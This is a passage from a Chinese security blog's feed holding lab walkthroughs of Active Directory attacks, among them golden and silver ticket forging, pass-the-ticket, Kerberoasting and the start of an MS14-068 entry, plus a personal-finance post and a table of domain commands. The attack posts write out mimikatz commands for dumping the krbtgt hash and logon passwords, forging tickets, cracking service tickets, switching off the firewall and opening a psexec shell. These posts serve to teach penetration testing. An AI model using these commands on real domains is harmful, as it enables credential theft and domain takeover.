    <url>/2020/05/10/09-x/</url>
    
    <content type="html"><![CDATA[<p>域渗透入门（五）金票据、银票据</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://ldapwiki.com/wiki/Golden%20Ticket">https://ldapwiki.com/wiki/Golden%20Ticket</a></li><li><a href="https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#introduction-3">https://m0chan.github.io/2019/07/31/How-To-Attack-Kerberos-101.html#introduction-3</a></li><li><a href="https://www.cnblogs.com/wuxinmengyi/p/11768481.html">https://www.cnblogs.com/wuxinmengyi/p/11768481.html</a></li><li><a href="https://www.youtube.com/watch?v=475V07I01J0">https://www.youtube.com/watch?v=475V07I01J0</a></li></ul><h2 id="录制的视频教程"><a href="#录制的视频教程" class="headerlink" title="录制的视频教程"></a>录制的视频教程</h2><ul><li><a href="https://www.acfun.cn/v/ac15446533">域渗透实践篇（六）黄金票据与白银票据</a></li></ul><h2 id="黄金票据"><a href="#黄金票据" class="headerlink" title="黄金票据"></a>黄金票据</h2><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/05-10-09/%E5%9F%9F%E6%B8%97%E9%80%8F%E6%BC%94%E7%A4%BA.png"></p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#导出krbtgt的ntlm hash</span><br>mimikatz.exe <span class="hljs-string">&quot;lsadump::dcsync /domain:0day.org /user:krbtgt&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment">#伪造黄金票据</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /admin:Administrator /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /krbtgt:36f9d9e6d98ecf8307baf4f46ef842a2 /ticket:Administrator.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment">#pass the ticket票据传递，获取域管理员权限</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::ptt Administrator.kirbi&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></div></td></tr></table></figure><h2 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a>白银票据</h2><h3 id="信息搜集-1"><a href="#信息搜集-1" class="headerlink" title="信息搜集"></a>信息搜集</h3><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql">/<span class="hljs-keyword">domain</span>: The FDQN<br><br>/<span class="hljs-keyword">user</span>: 要伪造的目标用户/计算机 Target Account/Computer <span class="hljs-keyword">to</span> Impersonate<br>/ptt: Optional (Will Inject Ticket <span class="hljs-keyword">or</span> you can <span class="hljs-keyword">do</span> <span class="hljs-keyword">with</span> Rubeus)<br>/service:cifs服务参数为cifs<br>/<span class="hljs-keyword">domain</span>    参数为域名<br>/sid   参数为域sid (whoami /<span class="hljs-keyword">user</span>)<br>/target    可能是目标计算机的主机名<br>/rc4       服务账号的ntml hash<br>/<span class="hljs-keyword">user</span>      需要伪造的用户名  NTLM Hash <span class="hljs-keyword">of</span> <span class="hljs-keyword">User</span> <span class="hljs-keyword">Password</span>/Computer <span class="hljs-keyword">Password</span><br></code></pre></div></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk"><span class="hljs-comment">#生成了mimikatz.log文件</span><br>mimikatz.exe log <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::logonpasswords&quot;</span> <span class="hljs-keyword">exit</span><br><br><span class="hljs-comment">#伪造白银票据，伪造CIFS服务权限</span><br>mimikatz.exe <span class="hljs-string">&quot;kerberos::golden /domain:0day.org /sid:S-1-5-21-1812960810-2335050734-3517558805 /target:OWA2010SP3.0day.org /service:CIFS /rc4:01832b04fa3aed862548241a387e3342 /user:Administrator /ptt&quot;</span> <span class="hljs-keyword">exit</span><br><br>dir \\OWA2010SP3\c$<br><br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WindowsDomain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WindowsDomain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>理财入门</title>
    <link href="/2020/05/06/11-x/"/>
    <url>/2020/05/06/11-x/</url>
    
    <content type="html"><![CDATA[<h1 id="理财入门"><a href="#理财入门" class="headerlink" title="理财入门"></a>理财入门</h1><p>风险越大利润越大。</p><h2 id="无风险"><a href="#无风险" class="headerlink" title="无风险"></a>无风险</h2><h3 id="银行活期利率"><a href="#银行活期利率" class="headerlink" title="银行活期利率"></a>银行活期利率</h3><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.中国银行：<span class="hljs-number">0</span>.<span class="hljs-number">35</span>%；<br><br><span class="hljs-attribute">2</span>.农业银行：<span class="hljs-number">0</span>.<span class="hljs-number">3</span>%；<br><br><span class="hljs-attribute">3</span>.广发银行：<span class="hljs-number">0</span>.<span class="hljs-number">3</span>%；<br><br><span class="hljs-attribute">4</span>.浙商银行：<span class="hljs-number">0</span>.<span class="hljs-number">35</span>%；<br><br><span class="hljs-attribute">5</span>.恒丰银行：<span class="hljs-number">0</span>.<span class="hljs-number">35</span>%；<br></code></pre></div></td></tr></table></figure><h3 id="银行定期利率"><a href="#银行定期利率" class="headerlink" title="银行定期利率"></a>银行定期利率</h3><p>整存整取定期存款：三个月为1.10%、半年为1.30%、一年为1.50%、二年为2.10%、三年为2.75%</p><h3 id="支付宝"><a href="#支付宝" class="headerlink" title="支付宝"></a>支付宝</h3><figure class="highlight erlang-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang-repl">余额宝：七日年化- <span class="hljs-number">1.6040</span><span class="hljs-comment">%</span><br>南方天天利货币A- <span class="hljs-number">1.9940</span><span class="hljs-comment">%</span><br></code></pre></div></td></tr></table></figure><h3 id="京东金融app（50万以下，全额赔付）"><a href="#京东金融app（50万以下，全额赔付）" class="headerlink" title="京东金融app（50万以下，全额赔付）"></a>京东金融app（50万以下，全额赔付）</h3><figure class="highlight erlang-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang-repl">银行精选利息最高不超过<span class="hljs-number">5</span><span class="hljs-comment">%</span><br>例如：多帮利——满<span class="hljs-number">7</span>天，利息<span class="hljs-number">3</span><span class="hljs-comment">%</span><br>——满<span class="hljs-number">3</span>个月，利息<span class="hljs-number">4.48</span><span class="hljs-comment">%</span><br>  民生银行——满<span class="hljs-number">35</span>天，利息<span class="hljs-number">3.974</span><span class="hljs-comment">%</span><br></code></pre></div></td></tr></table></figure><h2 id="低风险-中风险"><a href="#低风险-中风险" class="headerlink" title="低风险/中风险"></a>低风险/中风险</h2><h3 id="指数基金"><a href="#指数基金" class="headerlink" title="指数基金"></a>指数基金</h3><p>大盘指数基金：</p><p>收益率从百分之几到百分之十几，高的年化48%都有。比如说今年疫情，中欧医疗健康混合C，近一年的收益率64.4%</p><h3 id="纸黄金"><a href="#纸黄金" class="headerlink" title="纸黄金"></a>纸黄金</h3><p>购买方式：支付宝app——理财——黄金——买入。</p><p>纸黄金和指数基金是相反的，黄金涨，基金跌；基金涨，黄金跌。</p><h2 id="高风险"><a href="#高风险" class="headerlink" title="高风险"></a>高风险</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">股票：不说了。金融课老师说过，国内股票是庄家控股的，收割散户的。所以不玩。<br>富人依靠什么可以挣那么多钱？ - 徐斌的回答 - 知乎<br>https:<span class="hljs-regexp">//</span>www.zhihu.com<span class="hljs-regexp">/question/</span><span class="hljs-number">35540121</span><span class="hljs-regexp">/answer/</span><span class="hljs-number">329629223</span><br><br>比特币：这个可以跌去百分之<span class="hljs-number">90</span>，也可以翻倍，三倍，十倍，百倍。。<br>抱着全部输了也无所谓，一旦涨了直接财富自由的心态来玩。比如说投入<span class="hljs-number">10</span>万，翻<span class="hljs-number">100</span>倍就是<span class="hljs-number">1000</span>万。当然现在入场晚了，翻个几个倍就不错了。今年<span class="hljs-number">3</span>月，<span class="hljs-number">3</span>万多人民币一个，<span class="hljs-number">4</span>月<span class="hljs-number">30</span>日，<span class="hljs-number">6</span>万多人民币一个，这不是翻了倍吗？<br></code></pre></div></td></tr></table></figure><p>其他的不说了，因为不会玩。先写到这里。</p><h2 id="理财第一年收益情况"><a href="#理财第一年收益情况" class="headerlink" title="理财第一年收益情况"></a>理财第一年收益情况</h2><p>如果说我国的通货膨胀率是百分之8，那么1万块，一年后应该变成10800，才能勉强不亏。</p><figure class="highlight erlang-repl"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs erlang-repl">支付宝余额宝利息，几十块<br>京东金融银行精选，利息百分之四点几，赚了一百出头。<br>黄金，<span class="hljs-number">230</span>。有买有卖的没有统计收益率，差不多<span class="hljs-number">8</span><span class="hljs-comment">%吧，粗略估算的。</span><br>基金，今年大跌没有及时跑掉，去年赚的几百块，今年亏完了。前后抵消，赚了几十块。收益率<span class="hljs-number">2</span><span class="hljs-comment">%</span><br>比特币，这个是投的最多的一个<span class="hljs-number">5000</span>块，截至今天赚了<span class="hljs-number">1729</span>元。当然也很有可能亏回去。收益率<span class="hljs-number">34.58</span><span class="hljs-comment">%</span><br><br>总而言之，纯看收益率只有比特币才跑得过通货膨胀的样子。。<br></code></pre></div></td></tr></table></figure><p>总结：今年股票大跌，美股熔断好几次，影响到指数基金也跌的不行。当时应该补仓的，我抄底抄了2次，忍受不了过山车的恐惧，几乎都抛了。这是作为新手犯的一次严重的错误ORZ，反省中…… </p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透入门（三）pass the ticket</title>
    <link href="/2020/05/04/01-x/"/>
    <url>/2020/05/04/01-x/</url>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>乌云文章：《域渗透——Pass The Hash &amp; Pass The Key》、《域渗透——Pass The Ticket》、《从活动目录获取域管理员权限的各种姿势》</li><li><a href="https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a">https://medium.com/@t0pazg3m/pass-the-ticket-ptt-attack-in-mimikatz-and-a-gotcha-96a5805e257a</a></li><li><a href="https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref">https://resources.infosecinstitute.com/pass-hash-pass-ticket-no-pain/#gref</a></li></ul><h2 id="录制的视频教程"><a href="#录制的视频教程" class="headerlink" title="录制的视频教程"></a>录制的视频教程</h2><ul><li><a href="https://www.bilibili.com/video/BV1ve411s7Qd">域渗透实践篇（四）</a></li></ul><ol><li>pass the ticket</li></ol><h2 id="ptt票据传递实践"><a href="#ptt票据传递实践" class="headerlink" title="ptt票据传递实践"></a>ptt票据传递实践</h2><p>pass the hash: 一把钥匙开所有的门锁</p><p>pass the ticket: 进入房间后，找到备用钥匙（高权限票据），以备用钥匙来开门。有效时间10小时，过期后可以重新导入内存。域内普通用户获得域管理员权限。</p><p>dir \OWA2010SP3\C$</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">privilege::debug<br>sekurlsa::tickets /export  <span class="hljs-comment">#导出内存中的票据</span><br>kerberos::purge<br>以上命令可以写成下面的形式<br><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span> <span class="hljs-string">&quot;sekurlsa::tickets /export&quot;</span> <span class="hljs-keyword">exit</span><br><br>mimikatz.exe <span class="hljs-string">&quot;privilege::debug&quot;</span>  <span class="hljs-string">&quot;kerberos::ptt [0;3e4]-2-1-40e00000-SRV-DB-0DAY$@krbtgt-0DAY.ORG&quot;</span> <span class="hljs-keyword">exit</span><br></code></pre></div></td></tr></table></figure><h3 id="获取到域管理员权限之后"><a href="#获取到域管理员权限之后" class="headerlink" title="获取到域管理员权限之后"></a>获取到域管理员权限之后</h3><figure class="highlight dos"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs dos"><span class="hljs-built_in">net</span> <span class="hljs-built_in">time</span> /domain #查域控的主机名<br>psexec.exe \\OWA2010SP3 <span class="hljs-built_in">cmd</span>.exe  #使用域控主机名，获得域管理员权限的<span class="hljs-built_in">cmd</span> shell<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>WindowsDomain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WindowsDomain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透入门（四）Kerberoasting服务票据离线爆破密码</title>
    <link href="/2020/05/04/09-x/"/>
    <url>/2020/05/04/09-x/</url>
    
    <content type="html"><![CDATA[<p>域渗透入门（四）Kerberoasting服务票据离线爆破密码</p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li><a href="https://3gstudent.github.io/%E5%9F%9F%E6%B8%97%E9%80%8F-Kerberoasting/">域渗透——Kerberoasting</a></li><li><a href="https://attack.stealthbits.com/cracking-kerberos-tgs-tickets-using-kerberoasting">什么是kerberoasting</a></li><li><a href="https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/">https://blog.stealthbits.com/extracting-service-account-passwords-with-kerberoasting/</a></li><li><a href="https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/">https://blog.stealthbits.com/discovering-service-accounts-without-using-privileges/</a></li></ul><h2 id="录制的视频教程"><a href="#录制的视频教程" class="headerlink" title="录制的视频教程"></a>录制的视频教程</h2><ul><li><a href="https://www.bilibili.com/video/BV1Dg4y1q7X6">域渗透实践篇（五）</a></li></ul><ol><li>kerberoasting</li></ol><h2 id="spn“服务主体名称”是什么"><a href="#spn“服务主体名称”是什么" class="headerlink" title="spn“服务主体名称”是什么"></a>spn“服务主体名称”是什么</h2><p>服务帐户利用SPN支持Kerberos身份验证。也就是说，当客户端需要访问sever提供的服务的时候，那么就需要使用spn查询有哪些服务。</p><p>这种spn扫描，是正常的，在内网中，客户端想要访问服务器的资源，都需要想DC域控查询服务主体名称。就好像上火车要查询列车编号一样。</p><h2 id="如何查询spn"><a href="#如何查询spn" class="headerlink" title="如何查询spn"></a>如何查询spn</h2><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-string">setspn</span> <span class="hljs-string">-q</span> <span class="hljs-string">*/*</span><span class="hljs-comment">#列出域内的spn服务主体名称，这条命令向域控查询信息，所以需要有域控服务器</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">https://github.com/nidem/kerberoast</span><span class="hljs-comment">#这是脚本的下载地址</span><br><span class="hljs-string">./GetUserSPNs.ps1</span><span class="hljs-comment">#使用脚本查询spn服务主体名称</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">klist</span><br><span class="hljs-string">查看内存中的票据</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">通过spn，申请service</span> <span class="hljs-string">ticket服务票据</span><br><span class="hljs-string">Add-Type</span> <span class="hljs-string">-AssemblyName</span> <span class="hljs-string">System.IdentityModel</span><br><span class="hljs-string">New-Object</span> <span class="hljs-string">System.IdentityModel.Tokens.KerberosRequestorSecurityToken</span> <span class="hljs-string">-ArgumentList</span> <span class="hljs-string">&quot;MSSQLSvc/Srv-DB-0day.0day.org:1433&quot;</span><br></code></pre></div></td></tr></table></figure><p>方法一（mimikatz导出票据，tgsrepcrack.py破解票据）：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">导出申请的服务票据<br>mimikatz.exe <span class="hljs-string">&quot;kerberos::list /export&quot;</span> <span class="hljs-keyword">exit</span><br>导出的票据后缀名kirbi<br>缺点：目标主机上传mimikatz，会被杀软删除掉，必须关闭防火墙<br>---<br>爆破服务票据<br>python tgsrepcrack.py test.txt <span class="hljs-number">1</span>.kirbi<br>遇到错误，执行失败。github上，tgsrepcrack.py这个脚本从python2升级到了python3，也许因此出了bug。<br></code></pre></div></td></tr></table></figure><p>方法二（mimikatz导出票据，kirbi2john.py将导出的1.kirbi转换为hashcat可以破解的格式，使用hashcat破解）：</p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-meta">---</span><br><span class="hljs-string">从kirbi文件中提取出Kerberos</span> <span class="hljs-string">tickets</span><br><span class="hljs-string">python</span> <span class="hljs-string">/usr/share/john/kirbi2john.py</span> <span class="hljs-number">2</span><span class="hljs-string">-40a00000-jerry@MSSQLSvc~Srv-DB-0day.0day.org~1433-0DAY.ORG.kirbi</span> <span class="hljs-string">&gt;</span> <span class="hljs-string">output.txt</span><br><br><span class="hljs-string">output.txt的密码类型是Kerberos</span> <span class="hljs-number">5</span> <span class="hljs-string">TGS</span> <span class="hljs-string">etype</span> <span class="hljs-number">23</span> [<span class="hljs-string">MD4</span> <span class="hljs-string">HMAC-MD5</span> <span class="hljs-string">RC4</span>]<br><span class="hljs-meta">---</span><br><span class="hljs-string">使用hashcat或者john</span> <span class="hljs-string">the</span> <span class="hljs-string">ripper，爆破output.txt</span> <br><br><span class="hljs-string">john</span> <span class="hljs-string">--format=krb5tgs</span> <span class="hljs-string">output.txt</span> <span class="hljs-string">--wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="hljs-meta">---</span><br><span class="hljs-string">hashcat</span> <span class="hljs-string">-m</span> <span class="hljs-number">13100</span> <span class="hljs-string">output.txt</span> <span class="hljs-string">/usr/share/wordlists/rockyou.txt</span> <span class="hljs-string">--force</span><br></code></pre></div></td></tr></table></figure><p>方法三——Invoke-Kerberoast导出票据，hashcat破解：</p><figure class="highlight powershell"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs powershell">https://raw.githubusercontent.com/EmpireProject/Empire/master/<span class="hljs-keyword">data</span>/module_source/credentials/<span class="hljs-built_in">Invoke-Kerberoast</span>.ps1<br><br>执行没有任何结果<br><span class="hljs-built_in">import-module</span> .\<span class="hljs-built_in">Invoke-Kerberoast</span>.ps1<br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-AdminCount</span> <span class="hljs-literal">-OutputFormat</span> Hashcat | <span class="hljs-built_in">fl</span><br>提示没有AdminCount参数<br><br>---<br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-OutputFormat</span> Hashcat | <span class="hljs-built_in">fl</span><br><span class="hljs-built_in">Invoke-Kerberoast</span> <span class="hljs-literal">-OutputFormat</span> Hashcat | <span class="hljs-built_in">Select</span> hash | <span class="hljs-built_in">ConvertTo-CSV</span> <span class="hljs-literal">-NoTypeInformation</span><br><br></code></pre></div></td></tr></table></figure><h2 id="windows不允许执行powershell"><a href="#windows不允许执行powershell" class="headerlink" title="windows不允许执行powershell"></a>windows不允许执行powershell</h2><p>运行powershell脚本时，遇到“无法加载文件，因为在此系统禁止执行脚本”</p><p>在powershell面板下输入，<code>Set-ExecutionPolicy Unrestricted</code>，再输入“Y”，即可运行ps脚本</p><h2 id="cmd关闭防火墙"><a href="#cmd关闭防火墙" class="headerlink" title="cmd关闭防火墙"></a>cmd关闭防火墙</h2><p><code>NetSh Advfirewall</code> <code>set</code> <code>allprofiles state off</code><br><code>Netsh Advfirewall show allprofiles</code></p><p>netsh firewall set opmode mode=disable</p><h2 id="遇到的问题"><a href="#遇到的问题" class="headerlink" title="遇到的问题"></a>遇到的问题</h2><p>爆破服务票据密码的时候，py脚本提示<br><code>ImportError: No module named pyasn1.type</code></p><p>安装一下模块， <code>pip install pyasn1</code></p><hr><p>运行这条命令的时候<code>python tgsrepcrack.py  test.txt 1.kirbi</code><br>提示：</p><figure class="highlight vim"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs vim">  File <span class="hljs-string">&quot;C:\python27\lib\ntpath.py&quot;</span>, <span class="hljs-built_in">line</span> <span class="hljs-number">115</span>, in splitdrive<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(<span class="hljs-keyword">p</span>) &gt; <span class="hljs-number">1</span>:<br>TypeError: object of <span class="hljs-built_in">type</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-built_in">has</span> <span class="hljs-keyword">no</span> <span class="hljs-built_in">len</span>()<br>AttributeError: <span class="hljs-string">&#x27;file&#x27;</span> object <span class="hljs-built_in">has</span> <span class="hljs-keyword">no</span> attribute <span class="hljs-string">&#x27;rfind&#x27;</span><br></code></pre></div></td></tr></table></figure><p>原因，作者将脚本从py2升级py3，脚本有bug无法正常执行。</p>]]></content>
    
    
    <categories>
      
      <category>WindowsDomain</category>
      
    </categories>
    
    
    <tags>
      
      <tag>WindowsDomain</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>windows域-cmd用户管理命令</title>
    <link href="/2020/05/02/04-x/"/>
    <url>/2020/05/02/04-x/</url>
    
    <content type="html"><![CDATA[<h2 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h2><table><thead><tr><th>操作</th><th>命令</th><th>案例</th><th>解释</th></tr></thead><tbody><tr><td>从域主机获取当前时间</td><td>net time /domain</td><td>OWA2013.rootkit.org</td><td>OWA2013代表DC的主机名，rootkit.org代表域名。1. 拒绝访问，说明存在域，当前用户不是域用户 2. 命令成功完成。说明存在域，用户是域用户 3. 找不到域的域控制器，说明是工作组，不存在域。</td></tr><tr><td>查询当前用户登陆的域，或者登陆的工作组</td><td>net config workstation</td><td>工作站域 DNS 名称内容是workstation，说明是工作组，否则就是域</td><td></td></tr><tr><td>从域名查域控ip</td><td>ping 域名</td><td>ping rootkit.org</td><td>dns服务器会将域名解析为ip，通常安装了dns服务的就是域控主机</td></tr><tr><td>查询域用户SID（Security Identifiers）</td><td>whoami /user</td><td></td><td></td></tr><tr><td>查询域内所有用户</td><td>net user /domain</td><td></td><td></td></tr><tr><td>查询域用户所在域组</td><td>net user 域账号 /domain</td><td>net user administrator /domain</td><td></td></tr><tr><td>查询所在的域有哪些组</td><td>net group /domain</td><td></td><td></td></tr><tr><td>查询域组所包含的用户</td><td>net group 域组名 /domain</td><td>net group “Domain admins” /domain</td><td></td></tr></tbody></table><h2 id="只有域控DC能查询"><a href="#只有域控DC能查询" class="headerlink" title="只有域控DC能查询"></a>只有域控DC能查询</h2><table><thead><tr><th>操作</th><th>命令</th><th>案例</th><th>解释</th></tr></thead><tbody><tr><td>查看域内的所有域控主机的主机名(如果有多台)</td><td>net group “Domain controllers”</td><td></td><td></td></tr><tr><td>查看域管理员</td><td>net group “domain admins”</td><td></td><td></td></tr><tr><td>查看域用户</td><td>net group “domain users”</td><td></td><td></td></tr></tbody></table><h2 id="修改"><a href="#修改" class="headerlink" title="修改"></a>修改</h2><table><thead><tr><th>操作</th><th>命令</th><th>案例</th><th>解释</th></tr></thead><tbody><tr><td>修改域用户密码</td><td>net user /domain 用户名 要修改的密码</td><td>net user /domain zerosoul 12345678</td><td>需要域管理员权限</td></tr><tr><td>域Users组用户添加到本地Administrators组</td><td>net localgroup administrators 用户名 /add</td><td>net localgroup administrators whale /add</td><td>需要本地管理员或域管理员在本机登陆域后进行</td></tr></tbody></table>]]></content>
    
    
    <categories>
      
      <category>windows</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>域渗透入门（二）</title>
    <link href="/2020/04/27/04-x/"/>
    <url>/2020/04/27/04-x/</url>
    
    <content type="html"><![CDATA[<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul><li>乌云文章：《使用Hash直接登录Windows》</li><li><a href="https://en.wikipedia.org/wiki/Pass_the_hash">维基百科Pass_the_hash的定义</a></li><li><a href="https://www.fujieace.com/metasploit/mimikatz.html">metasploit mimikatz</a></li><li><a href="https://www.anquanke.com/post/id/172900#h2-0">Kerberos协议探索系列之票据篇：MS14068漏洞和Kerberos票据的利用说明</a></li></ul><h2 id="录制的视频教程"><a href="#录制的视频教程" class="headerlink" title="录制的视频教程"></a>录制的视频教程</h2><p> <a href="https://www.bilibili.com/video/BV1Qz411B7BQ">域渗透实践篇（二）</a></p><ol><li>域信息搜集</li><li>ms14-068 域普通用户提权到域管理员</li></ol><p> <a href="https://www.acfun.cn/v/ac15162313">域渗透实践篇（三）</a></p><ol><li>pass the hash票据传递攻击</li></ol><h2 id="Kerberos域用户提权漏洞ms14-068"><a href="#Kerberos域用户提权漏洞ms14-068" class="headerlink" title="Kerberos域用户提权漏洞ms14-068"></a>Kerberos域用户提权漏洞ms14-068</h2><h3 id="准备域内普通用户权限（以及DC未打补丁）"><a href="#准备域内普通用户权限（以及DC未打补丁）" class="headerlink" title="准备域内普通用户权限（以及DC未打补丁）"></a>准备域内普通用户权限（以及DC未打补丁）</h3><ol><li><p>域控添加一个user用户</p></li><li><p>192.168.1.3 计算机添加user用户</p><figure class="highlight crmsh"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs crmsh">net <span class="hljs-keyword">user</span> <span class="hljs-title">user</span> admin!@<span class="hljs-comment">#45      #添加一个用户user，添加密码</span><br>---<br>注销管理员用户，登陆用户<span class="hljs-keyword">user</span><br><span class="hljs-title">用户名：SRV-WEB-KIT</span>\<span class="hljs-keyword">user</span><br><span class="hljs-title">密码：admin</span>!@<span class="hljs-comment">#45</span><br></code></pre></div></td></tr></table></figure></li><li><p>测试域普通用户与域管理员区别</p></li><li><p>生成高权限票据</p><figure class="highlight subunit"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs subunit">python ms14<span 